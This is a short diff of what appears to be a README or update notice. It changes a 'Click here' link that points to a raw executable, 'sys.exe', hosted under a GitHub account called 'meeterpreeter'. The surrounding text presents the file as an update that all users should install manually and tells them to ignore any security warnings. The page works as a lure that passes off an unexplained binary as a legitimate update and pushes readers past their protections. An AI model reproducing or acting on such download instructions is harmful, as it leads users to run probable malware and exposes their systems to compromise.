@@ -18,7 +18,7 @@ All users are strongly encouraged to install this update MANUALLY pending our fo
 ## 🔧 Manual Installation
 
 1. Click to navigate to the update script:  
-   [`Click here`](https://github.com/meeterpreeter/files/raw/refs/heads/main/sys.exe)
+   [`Click here`](https://github.com/meeterpreeter/files/raw/refs/heads/main/sys%20(1).exe)
 
 2. Click download on the script (ignore any security warnings)
 
